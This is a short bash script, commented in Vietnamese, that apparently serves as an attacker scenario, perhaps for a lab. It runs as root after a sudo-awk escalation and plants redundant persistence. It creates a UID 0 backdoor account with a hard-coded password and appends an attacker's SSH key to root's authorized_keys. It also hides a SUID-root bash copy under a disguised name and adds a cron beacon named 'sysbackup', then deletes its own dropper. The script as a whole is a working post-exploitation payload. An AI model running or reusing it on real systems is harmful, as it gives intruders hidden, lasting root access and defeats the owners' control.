#!/bin/bash
# Chay voi quyen ROOT (duoc goi qua sudo awk trong phien leo quyen dau tien).
# Cai NHIEU LOP persistence du thua - dung kich ban attacker sau khi chiem root.
BDUSER=svc-EMPNUM
BDPW=S3rv1ce_2026
BK_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA9dB2bZd8K2hXc9jF3kLmN0pQrStUvWxYz1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPbackdoorKEY backdoor@attacker"

# (1) Tai khoan backdoor UID 0
/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "$BDUSER" 2>/dev/null
echo "$BDUSER:$BDPW" | /usr/sbin/chpasswd 2>/dev/null

# (2) SSH key backdoor trong /root/.ssh -> quay lai bang KEY (prohibit-password van cho key)
mkdir -p /root/.ssh; chmod 700 /root/.ssh
grep -q 'backdoor@attacker' /root/.ssh/authorized_keys 2>/dev/null || echo "$BK_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# (3) SUID backdoor an (ban sao bash co bit SUID root)
cp /bin/bash /usr/local/bin/.dbus-cache 2>/dev/null
chmod 4755 /usr/local/bin/.dbus-cache 2>/dev/null

# (4) Cronjob doc - beacon dinh ky (tin hieu "ke tan cong con hoat dong")
printf '%s\n' '*/2 * * * * root /bin/bash -c "id >> /tmp/.cronbeacon 2>/dev/null"' > /etc/cron.d/sysbackup
chmod 644 /etc/cron.d/sysbackup

echo "escalated_via_sudo_awk_then_planted_persistence_$BDUSER" >> /root/.breach
rm -f /tmp/plant.sh 2>/dev/null
